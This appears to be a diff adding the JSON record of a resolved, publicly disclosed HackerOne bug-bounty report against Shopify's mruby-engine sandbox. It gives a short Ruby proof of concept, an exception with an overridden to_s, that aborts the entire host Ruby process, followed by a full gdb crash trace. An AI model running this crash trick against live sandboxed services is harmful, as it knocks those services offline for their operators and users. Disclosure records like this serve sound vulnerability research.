@@ -1,0 +1,131 @@
+{
+  "id": 180977,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODA5Nzc=",
+  "url": "https://hackerone.com/reports/180977",
+  "title": "Exception cause SIGABRT",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2016-11-08T20:17:22.613Z",
+  "submitted_at": "2016-11-08T20:17:22.613Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "isra17",
+    "url": "/isra17",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 15668,
+    "url": "https://hackerone.com/shopify-scripts",
+    "handle": "shopify-scripts",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "shopify-scripts",
+      "twitter_handle": "",
+      "website": "",
+      "about": ""
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2016-12-16T20:05:23.592Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-12-16T20:05:23.558Z",
+  "team_member_agreed_on_going_public_at": "2016-12-16T19:35:25.653Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Overriding the `to_s` method of an exception and raise it from a sandboxed mruby evaluation result in a `abort()` call from `mruby`. This results with the whole ruby process terminating.\n\nTested on [4cd4dfc855f0cce18b1ee2f318927c13edb20d14](https://github.com/Shopify/mruby-engine/tree/4cd4dfc855f0cce18b1ee2f318927c13edb20d14)\n\n# POC\n\n```\n# poc.rb\nclass A < Exception\n  def to_s\n  end\nend\nraise A.new\n```\n\n`$ bin/sandbox poc.rb`\n\n# Crash Stacktrace:\n```\n Thread 1 (Thread 0x7fe2b0992700 (LWP 26764)):\n #0  0x00007fe2aff8e428 in __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:54\n         resultvar = 0\n         pid = 26764\n         selftid = 26764\n #1  0x00007fe2aff9002a in __GI_abort () at abort.c:89\n         save_stage = 2\n         act = {__sigaction_handler = {sa_handler = 0x7fe2aadaf4e0, sa_sigaction = 0x7fe2aadaf4e0}, sa_mask = {__val = {140611505812704, 0, 140611505991664, 0, 140611527335906, 140611505812704, 140611527442253, 0, 0, 140611505812704, 140611505843808, 0, 0, 140611505812704, 140611505888960, 0}}, sa_flags = 0, sa_restorer = 0x7fe2aadb6e60}\n         sigs = {__val = {32, 0 <repeats 15 times>}}\n #2  0x00007fe2ac234bbc in mrb_exc_raise (mrb=mrb@entry=0x7fe2aadaf4e0, exc=...) at /home/isra17/devel/mruby-engine/ext/mruby_engine/mruby/src/error.c:295\n No locals.\n #3  0x00007fe2ac234f66 in mrb_raisef (mrb=mrb@entry=0x7fe2aadaf4e0, c=0x7fe2aadb6920, fmt=fmt@entry=0x7fe2ac2a3888 \"%S cannot be converted to %S by #%S\") at /home/isra17/devel/mruby-engine/ext/mruby_engine/mruby/src/error.c:371\n         args = <error reading variable args (Attempt to dereference a generic pointer.)>\n         mesg = <optimized out>\n #4  0x00007fe2ac24c784 in mrb_convert_type (mrb=mrb@entry=0x7fe2aadaf4e0, val=val@entry=..., type=type@entry=MRB_TT_STRING, tname=tname@entry=0x7fe2ac2a23d9 \"String\", method=method@entry=0x7fe2ac29fdba \"to_s\") at /home/isra17/devel/mruby-engine/ext/mruby_engine/mruby/src/object.c:340\n         v = <optimized out>\n #5  0x00007fe2ac23a3ae in mrb_str_to_str (mrb=mrb@entry=0x7fe2aadaf4e0, str=...) at /home/isra17/devel/mruby-engine/ext/mruby_engine/mruby/src/string.c:1016\n         s = <optimized out>\n #6  0x00007fe2ac23d338 in mrb_string_value_cstr (mrb=0x7fe2aadaf4e0, ptr=ptr@entry=0x7ffefeff51e0) at /home/isra17/devel/mruby-engine/ext/mruby_engine/mruby/src/string.c:2222\n         str = <optimized out>\n         ps = <optimized out>\n         len = <optimized out>\n         p = <optimized out>\n #7  0x00007fe2ac21e4ba in me_mruby_engine_get_exception (self=self@entry=0x7fe2aadaf3e0) at ../../../../ext/mruby_engine/mruby_engine.c:106\n         host_backtrace = 22683040\n         backtrace = {value = {p = 0x7fe2aadb7370, {i_flag = 0, i = 70305752922552}, {sym_flag = 112, sym = 32738}, bp = 0x7fe2aadb7370, fp = 0x7fe2aadb7370, vp = 0x7fe2aadb7370}, w = 140611505845104}\n         class_name_obj = {value = {p = 0x7fe2aadb7280, {i_flag = 0, i = 70305752922432}, {sym_flag = 128, sym = 32738}, bp = 0x7fe2aadb7280, fp = 0x7fe2aadb7280, vp = 0x7fe2aadb7280}, w = 140611505844864}\n         class_name = 0x7fe2aadb7280\n         message = {value = {p = 0x7fe2aadb7430, {i_flag = 0, i = 70305752922648}, {sym_flag = 48, sym = 32738}, bp = 0x7fe2aadb7430, fp = 0x7fe2aadb7430, vp = 0x7fe2aadb7430}, w = 140611505845296}\n         err = <optimized out>\n #8  0x00007fe2ac21c04c in me_mruby_engine_eval (self=self@entry=0x7fe2aadaf3e0, proc=<optimized out>, err=err@entry=0x7ffefeff53d0) at ../../../../ext/mruby_engine/eval_monitored.c:227\n         err_no = <optimized out>\n         thread = 140611505809152\n         ru_then = {ru_utime = {tv_sec = 0, tv_usec = 296000}, ru_stime = {tv_sec = 0, tv_usec = 20000}, {ru_maxrss = 27092, __ru_maxrss_word = 27092}, {ru_ixrss = 0, __ru_ixrss_word = 0}, {ru_idrss = 0, __ru_idrss_word = 0}, {ru_isrss = 0, __ru_isrss_word = 0}, {ru_minflt = 4523, __ru_minflt_word = 4523}, {ru_majflt = 0, __ru_majflt_word = 0}, {ru_nswap = 0, __ru_nswap_word = 0}, {ru_inblock = 0, __ru_inblock_word = 0}, {ru_oublock = 0, __ru_oublock_word = 0}, {ru_msgsnd = 0, __ru_msgsnd_word = 0}, {ru_msgrcv = 0, __ru_msgrcv_word = 0}, {ru_nsignals = 0, __ru_nsignals_word = 0}, {ru_nvcsw = 10, __ru_nvcsw_word = 10}, {ru_nivcsw = 30, __ru_nivcsw_word = 30}}\n         ru_now = {ru_utime = {tv_sec = 0, tv_usec = 296000}, ru_stime = {tv_sec = 0, tv_usec = 20000}, {ru_maxrss = 27160, __ru_maxrss_word = 27160}, {ru_ixrss = 0, __ru_ixrss_word = 0}, {ru_idrss = 0, __ru_idrss_word = 0}, {ru_isrss = 0, __ru_isrss_word = 0}, {ru_minflt = 4525, __ru_minflt_word = 4525}, {ru_majflt = 0, __ru_majflt_word = 0}, {ru_nswap = 0, __ru_nswap_word = 0}, {ru_inblock = 0, __ru_inblock_word = 0}, {ru_oublock = 0, __ru_oublock_word = 0}, {ru_msgsnd = 0, __ru_msgsnd_word = 0}, {ru_msgrcv = 0, __ru_msgrcv_word = 0}, {ru_nsignals = 0, __ru_nsignals_word = 0}, {ru_nvcsw = 11, __ru_nvcsw_word = 11}, {ru_nivcsw = 30, __ru_nivcsw_word = 30}}\n         bypass_ctx = <optimized out>\n         cid = -214394\n         wait_result = <optimized out>\n #9  0x00007fe2ac21cc61 in ext_mruby_engine_eval (rself=22683280, rpath=22683200, rsource=22683080) at ../../../../ext/mruby_engine/ext.c:199\n         err = 8\n         proc = <optimized out>\n #10 0x00007fe2b049a50b in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3\n No symbol table info available.\n #11 0x00007fe2b04a84a3 in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3\n No symbol table info available.\n #12 0x00007fe2b04a94d3 in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3\n No symbol table info available.\n #13 0x00007fe2b049e269 in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3\n No symbol table info available.\n #14 0x00007fe2b04a3142 in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3\n No symbol table info available.\n #15 0x00007fe2b0389cfd in ?? () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3\n No symbol table info available.\n #16 0x00007fe2b038b6fd in ruby_exec_node () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3\n No symbol table info available.\n #17 0x00007fe2b038d83e in ruby_run_node () from /usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3\n No symbol table info available.\n #18 0x000000000040087b in ?? ()\n No symbol table info available.\n #19 0x00007fe2aff79830 in __libc_start_main (main=0x400830, argc=3, argv=0x7ffefeff5e38, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7ffefeff5e28) at ../csu/libc-start.c:291\n         result = <optimized out>\n         unwind_buf = {cancel_jmp_buf = {{jmp_buf = {0, -1400422201668288379, 4196480, 140733176569392, 0, 0, 1399860906120036485, 1393279154571296901}, mask_was_saved = 0}}, priv = {pad = {0x0, 0x0, 0x7ffefeff5e58, 0x7fe2b09c7168}, data = {prev = 0x0, cleanup = 0x0, canceltype = -16818600}}}\n         not_first_call = <optimized out>\n #20 0x00000000004008a9 in _start ()\n No symbol table info available.\nTitle: ruby2.3 crashed with SIGABRT in mrb_exc_raise()\n```\n\nCheers!",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2017-01-15T19:35:25.689Z",
+  "allow_singular_disclosure_after": -293831495.05853355,
+  "singular_disclosure_allowed": true,
+  "vote_count": 13,
+  "voters": [
+    "isra17",
+    "michiel",
+    "mpz",
+    "eveeez",
+    "khizer47",
+    "ak1t4",
+    "japz",
+    "spetr0x",
+    "scept1c",
+    "jmlb1337",
+    "and 3 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.5,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "none",
+      "availability": "high"
+    }
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
